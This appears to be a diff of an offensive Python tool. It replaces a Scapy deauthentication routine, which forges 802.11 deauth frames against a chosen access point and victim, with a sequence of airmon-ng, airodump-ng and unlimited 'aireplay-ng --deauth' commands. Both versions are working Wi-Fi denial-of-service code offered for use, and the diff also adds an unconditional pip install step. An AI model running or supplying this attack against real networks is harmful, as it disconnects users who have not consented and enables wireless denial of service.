@@ -3,6 +3,10 @@ import time
 from concurrent.futures import ThreadPoolExecutor
 import socket
 try:
+    import Flask
+except ImportError:
+    os.system("pip install flask")
+try:
     from scapy.all import ARP, Ether, sniff
 except ImportError:
     os.system("pip install scapy")
@@ -193,117 +197,30 @@ def main():
         findgeo()
 
     elif selectoption == 2:
-        mon = "mon"
         os.system("clear")
         logo()
         print("")
-        print("Enter target AP")
-        TARGET_AP = input("> ")
-        print("Enter victim MAC")
-        VICTIM_MAC = input("> ")
-        print("Select interface (It has to be wireless)")
-        INTERFACE = input("> ")
-        print("Enter amount of packets")
-        PACKET_COUNT = int(input("> "))
-
-        
-        """TARGET_AP = "FF:FF:FF:FF:FF:FF"  # Change to your target AP MAC (BSSID)
-        VICTIM_MAC = "00:00:00:00:00:00"  # Change to victim MAC (use FF:FF:FF:FF:FF:FF for broadcast)
-        INTERFACE = ""  # Change to your wireless interface (must be in monitor mode)
-        PACKET_COUNT = 100  # Number of deauth packets to send """
-
-        def spam_deauth():
-            os.system("clear")
-            logo()
-            print("")
-            print(CYELLOW+CBOLD+"Initiating deauthentication attack...")
-            print(f"Target AP: {TARGET_AP}")
-            print(f"Victim: {VICTIM_MAC}")
-            print(f"Interface: {INTERFACE}")
-            print(f"Packets: {PACKET_COUNT}"+CEND)
-            print("")
-
-            # Validate MAC addresses
-            def is_valid_mac(mac):
-                import re
-                pattern = r'^([0-9A-Fa-f]{2}[:]){5}([0-9A-Fa-f]{2})$'
-                return re.match(pattern, mac) is not None
-            
-            if not is_valid_mac(TARGET_AP) or not is_valid_mac(VICTIM_MAC):
-                print(CYELLOW+CBOLD+"Invalid MAC address format. Use format like: AA:BB:CC:DD:EE:FF"+CEND)
-                time.sleep(2)
-                main()
-            
-            try:
-                packets_sent = 0
-                
-                while packets_sent < PACKET_COUNT:
-                    try:
-                        # Create deauthentication packet
-                        # Method 1: To AP (target AP receives deauth for victim)
-                        packet1 = RadioTap() / \
-                                Dot11(type=0, subtype=12, addr1=TARGET_AP, addr2=VICTIM_MAC, addr3=TARGET_AP) / \
-                                Dot11Deauth(reason=7)
-                        
-                        # Method 2: To victim (victim receives deauth from AP)
-                        packet2 = RadioTap() / \
-                                Dot11(type=0, subtype=12, addr1=VICTIM_MAC, addr2=TARGET_AP, addr3=TARGET_AP) / \
-                                Dot11Deauth(reason=7)
-                        
-                        # Send both types of packets
-                        sendp(packet1, iface=INTERFACE, count=1, verbose=False)
-                        sendp(packet2, iface=INTERFACE, count=1, verbose=False)
-                        
-                        packets_sent += 2
-                        
-                        if packets_sent % 20 == 0:
-                            print(f"Sent {packets_sent} deauth packets...")
-                        
-                        time.sleep(0.1)  # Small delay to avoid flooding
-                        
-                    except KeyboardInterrupt:
-                        print("\nAttack stopped by user")
-                        break
-                    except Exception as e:
-                        print(f"Error sending packet: {e}")
-                        time.sleep(1)  # Wait before retrying
-                
-                print(f"\nAttack complete! Total packets sent: {packets_sent}")
-            
-            except PermissionError:
-                print("Permission denied. Run as root/administrator!")
-            except Exception as e:
-                print(f"Error: {e}")
-
-        if __name__ == "__main__":
-            # Check if running as root
-            if os.name == 'posix' and os.geteuid() != 0:
-                print("This script must be run as root!")
-                print("Try: sudo python3 deauth_attack.py")
-                exit(1)
-            
-            # Check if Scapy is properly installed
-            try:
-                from scapy.layers.dot11 import Dot11Deauth
-            except ImportError:
-                print("Required modules not found.")
-                print("Install Scapy: pip install scapy")
-                exit(1)
-            
-            # Check if interface exists
-            import subprocess
-            try:
-                result = subprocess.run(['ip', 'link', 'show', INTERFACE], 
-                                    capture_output=True, text=True)
-                if result.returncode != 0:
-                    print(CYELLOW+CBOLD+f"Interface {INTERFACE} not found!")
-                    print("Available interfaces:"+CEND)
-                    subprocess.run(['ip', 'link', 'show'])
-                    exit(1)
-            except:
-                pass  # If ip command fails, continue anyway
-            
-            spam_deauth()
+        os.system("iwconfig")
+        print("Select wireless interace")
+        wint = input("> ")
+        os.system(f"sudo airmon-ng start {wint}")
+        print("")
+        print("Wait")
+        time.sleep(2)
+        os.system("clear")
+        logo()
+        print("")
+        print(CRED+CBOLD+"Select target MAC adress"+CEND)
+        print(CRED+CBOLD+"Press CTRL+C to stop and select"+CEND)
+        os.system("airodump-ng "+wint)
+        macadress = input("> ")
+        print("Attack starting...")
+        time.sleep(1.6)
+        os.system("clear")
+        logo()
+        print("")
+        print(CRED+CBOLD+"Press CTRL+C to stop"+CEND)
+        os.system("aireplay-ng --deauth 0 -a "+macadress+" "+wint)
 
     elif selectoption == 3:
         os.system("clear")
